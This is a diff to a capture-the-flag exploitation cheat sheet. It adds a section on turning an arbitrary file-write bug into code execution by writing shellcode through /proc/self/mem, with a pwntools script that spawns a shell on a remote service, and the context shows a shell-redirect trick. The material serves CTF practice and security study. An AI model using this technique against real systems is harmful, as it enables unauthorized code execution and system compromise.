@@ -6,6 +6,7 @@
 - [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
 - [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
 - [Shell Tricks](#shell-tricks)
+- [Write-Anywhere via /proc/self/mem (BSidesSF 2025)](#write-anywhere-via-procselfmem-bsidessf-2025)
 
 ---
 
@@ -94,3 +95,33 @@ ls -la /proc/self/fd           # List open file descriptors
 **Short shellcode alternatives:**
 - `sh<&3 >&3` - minimal shell redirect
 - Use `$0` instead of `sh` in some shells
+
+---
+
+## Write-Anywhere via /proc/self/mem (BSidesSF 2025)
+
+When a service allows writing to arbitrary files at arbitrary offsets, target `/proc/self/mem` for code injection:
+
+```python
+from pwn import *
+
+# Service API: send filename, offset, content
+def write_mem(r, offset, data):
+    r.sendline(b'/proc/self/mem')
+    r.sendline(str(offset).encode())
+    r.sendline(data)
+
+# 1. Leak a return address from the stack (or use known binary address)
+# 2. Write shellcode to a writable+executable region (or reuse existing code)
+# 3. Overwrite return address to point to shellcode
+
+shellcode = asm(shellcraft.sh())
+
+r = remote(host, port)
+# Overwrite code at known address (e.g., after close@plt returns)
+write_mem(r, target_code_addr, shellcode)
+```
+
+**Key insight:** `/proc/self/mem` provides random-access read/write to the process's virtual memory, bypassing page protections that mmap enforces. Writing to text segments (code) works even when the segment is mapped read-only via normal mmap -- the kernel performs the write through the page tables directly. This makes it equivalent to a debugger `PTRACE_POKETEXT`.
+
+**Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address.
